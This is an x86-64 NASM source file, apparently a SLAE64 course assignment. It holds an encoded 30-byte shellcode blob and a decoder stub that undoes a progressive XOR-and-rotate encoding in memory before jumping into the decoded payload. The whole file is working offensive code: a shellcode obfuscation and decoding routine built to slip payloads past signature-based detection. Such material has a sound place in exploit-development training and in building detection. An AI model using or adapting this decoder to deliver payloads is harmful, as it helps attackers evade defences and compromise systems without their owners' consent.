
; Filename: Decoder.nasm
; Author:  SLAE64 - 1525
;
; Purpose: decode bytecode with progressive xor

BITS 64

global _start

section .data ; read/write

EncodedShellcode db 0xe8,0xc1,0x37,0x42,0x82,0xc8,0x10,0x95,0xc2,0x56,0x3c,0x29,0x1a,0x17,0xb4,0x30,0xf2,0x11,0x04,0xb6,0x65,0xea,0x15,0x04,0xbe,0xb5,0xb3,0xf9,0x20,0x27
EncodedShellcodeLenght equ $-EncodedShellcode

section .text ; readonly

InitialXORValue equ 0xaa

_start:

decoder:
	lea rdi, [rel EncodedShellcode]

	push EncodedShellcodeLenght ; shellcode lenght
	pop rcx
	
    push InitialXORValue ; initial value of XOR operation
    pop rdx

decode:
	xor dl, byte [rdi]  ; xor with the current byte
	ror dl, 3           ; rotate right with 3
	mov [rdi], dl  ; save back the transformed byte
	inc rdi
	loop decode

	jmp EncodedShellcode ; jump to the original shellcode now decoded
